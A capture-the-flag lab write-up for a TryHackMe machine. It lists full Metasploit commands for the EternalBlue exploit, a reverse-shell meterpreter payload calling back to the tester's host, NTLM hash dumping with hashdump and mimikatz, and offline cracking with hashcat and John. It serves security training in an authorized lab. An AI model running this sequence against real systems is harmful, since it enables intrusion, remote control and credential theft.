# TryHackMe Lab — Exploit Write-up (EternalBlue → Meterpreter → Flag & Hash)
**Warning:** This file documents actions taken *only* in an authorized lab environment. Do **not** run these commands against systems you don't own or have explicit written permission to test.

---

## Summary
Target: **TryHackMe lab** (example IP used during the session: `10.201.62.125`)  
Initial access: **EternalBlue (MS17-010)** exploit via Metasploit → **meterpreter** session → Windows shell → locate `flag.txt` and dump NTLM hash.  
Objective: document the process, the commands used, and *why* each step was taken (lab-safe, educational).

---

## 1) Recon / Service discovery
**Why:** confirm services, versions, and look for indications of known vulnerabilities (e.g., MS17-010). Importing results into Metasploit DB allows re-use by modules and DB queries.

**Commands (examples):**
```bash
# Standard nmap service/version scan with smb vuln scripts (outside msfconsole)
nmap -sV -p 139,445,3389 --script=smb-enum-shares,smb-os-discovery,smb-vuln* -oN nmap_smb_scan.txt 10.201.62.125

# Or import directly to Metasploit's DB
msfconsole
db_nmap -sV -p 139,445,3389 --script=smb-enum-shares,smb-os-discovery,smb-vuln* 10.201.62.125

# Check DB entries
hosts
services
vulns
```
**Notes:** Look for output lines indicating `smb-vuln-ms17-010` or explicit OS/service version strings — these guide module selection.

---

## 2) SMB enumeration (confirm and gather info)
**Why:** discover shares, readable files, usernames, and other artifacts that may aid exploitation or post-exploitation. This can reveal credentials or interesting files without exploiting the target.

**Commands:**
```bash
# list SMB shares (anonymous)
smbclient -L //10.201.62.125 -N

# enumerate SMB shares and permissions (smbmap)
smbmap -H 10.201.62.125

# deeper SMB-specific enumeration
enum4linux -a 10.201.62.125
```

---

## 3) Search & choose Metasploit module
**Why:** match known vuln to a Metasploit exploit module. `search` helps find modules for the service/vuln indicated by enumeration outputs.

**Commands (in `msfconsole`):**
```text
# Start Metasploit framework
msfconsole

# Search modules for SMB or specific vuln
search smb
search ms17_010
```

---

## 4) Inspect and configure the exploit module
**Why:** `info` and `show options` reveal required settings (RHOSTS/RPORT/payload/etc.) and any module-specific notes. Always verify these before running an exploit.

**Commands (example: EternalBlue module):**
```text
use exploit/windows/smb/ms17_010_eternalblue
info
show options

# Set target and network options (replace with lab IPs)
set RHOSTS 10.201.62.125
set RPORT 445
set THREADS 10

# Choose a payload and configure callback
show payloads
set PAYLOAD windows/x64/meterpreter/reverse_tcp
set LHOST 10.201.56.193    # your AttackBox IP
set LPORT 4444
show options
```
**Why payload selection matters:** payloads determine the type of session you get (meterpreter is a flexible post-exploitation environment). Choose architecture-appropriate payload (x86 vs x64).

---

## 5) Run exploit and obtain session
**Why:** execute exploit only in the lab and monitor output for success/failure and session creation.

**Commands:**
```text
# execute
run
# or
exploit
```
**After successful exploit:** Metasploit will show a session ID (e.g., `meterpreter >`). List and interact with sessions:
```text
sessions -l
sessions -i 1
```

---

## 6) Post-exploitation: inspect privileges and host
**Why:** determine what actions are possible (finding flags, dumping hashes, escalating privileges). `getuid` and `sysinfo` quickly show context.

**Meterpreter commands:**
```
sysinfo
getuid
getsystem       # try to elevate to SYSTEM (lab-only; may or may not succeed)
```
**If `getuid` shows a normal user, you may need to escalate privileges before dumping SAM hashes.**

---

## 7) Locating and retrieving `flag.txt`
**Why:** lab objective often includes finding a proof file; do this with the least noisy method possible.

**Meterpreter file commands (preferred):**
```text
# search and read (if supported)
search -f flag.txt
cat C:\\path\\to\\flag.txt
download C:\\path\\to\\flag.txt /root/tryhackme/flags/flag.txt
```
**Or from a meterpreter shell using PowerShell (robust):**
```text
shell
powershell -c "Get-ChildItem -Path C:\ -Filter flag.txt -Recurse -ErrorAction SilentlyContinue | Select-Object FullName"
powershell -c "Get-Content 'C:\\path\\to\\flag.txt' -Raw"
# or classic windows:
dir C:\flag.txt /s /b
type C:\path\to\flag.txt
```

---

## 8) Dumping NTLM hashes (lab-only)
**Why:** NTLM hashes can be cracked offline to reveal plaintext credentials (useful for lateral movement or root/administrator access in a lab). Dumping typically requires SYSTEM privileges.

**Option A — Meterpreter built-in:**
```
# requires SYSTEM
hashdump
```
**Option B — Metasploit post module:**
```text
# from msfconsole root
use post/windows/gather/hashdump
set SESSION 1
run
```
**Option C — Kiwi / mimikatz (more intrusive):**
```text
use post/windows/gather/mimikatz
set SESSION 1
run
# or inside meterpreter:
load kiwi
creds_all
```
**Note:** these actions are noisy and may trigger detection; use only in labs or with permission.

---

## 9) Preparing and cracking the NTLM hash
**Why:** obtain plaintext password offline using hash cracking tools. NTLM is unsalted so identical passwords map to identical hashes.

**Prepare hash file (NTLM-only, one per line):**
```bash
echo "8ce9a3ebd1647fcc5e04025019f4b875" > hash.txt
```

**Hashcat (GPU) example:**
```bash
# NTLM = -m 1000, dictionary attack with rules
hashcat -m 1000 -a 0 hash.txt /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule --show
```

**John the Ripper (CPU) example:**
```bash
john --format=NT --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
john --show hash.txt
```

---

## 10) Session management, cleanup, and documentation
**Why:** be professional: document steps and revert any snapshot; remove artifacts if appropriate for the lab rules.

**Commands to log and cleanup:**
```text
# capture msfconsole output
spool /root/tryhackme/msf_output.txt
# after actions
spool off

# kill sessions when done
sessions -k 1
exit
```

---

## 11) Ethical & lab-safety reminders
- Only run these commands in authorized labs (TryHackMe, HackTheBox, or VMs you own).  
- Snapshot the target VM before exploitation and revert after finishing.  
- Log everything (timestamps, commands, outputs) for a lab report.  
- Avoid persistence or destructive actions unless explicitly part of the lab instructions.

---

## References (where to learn more)
- Metasploit documentation (`msfconsole --help`)  
- TryHackMe / HackTheBox labs and write-ups  
- Hashcat and John the Ripper manuals for cracking details

---
*End of write-up.*
